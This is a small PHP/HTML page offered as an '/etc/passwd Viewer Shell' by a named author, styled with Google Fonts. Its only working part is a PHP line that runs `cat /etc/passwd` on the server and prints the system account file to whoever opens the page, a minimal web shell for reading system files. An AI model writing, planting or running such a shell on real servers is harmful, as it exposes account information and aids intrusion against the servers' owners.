<html>
<head>
<style>
@import url('https://fonts.googleapis.com/css2?family=Nunito&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Roboto+Mono&display=swap');

.header {
       color: white;
       font-size: 40px;
       font-family: 'Roboto Mono', monospace;
       background: -webkit-linear-gradient(#eee, #ADADAD);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
}

.text {
     color: black;
     font-family: 'Nunito';
	 font-size: 20px;
	
}
</style>
<title>/etc/passwd Viewer </title>
</head>
<body>
<center>
	<br>
	<br>
<p class="header">etc/passwd Viewer Shell</p>
<p class="text">Coded By Xale</p>
<p class="text">My GitHub: @xaletr</p>
<?php 
$islem = `cat /etc/passwd`;

echo "<pre>".$islem."</pre>";
?>
</center>

</body>
</html>
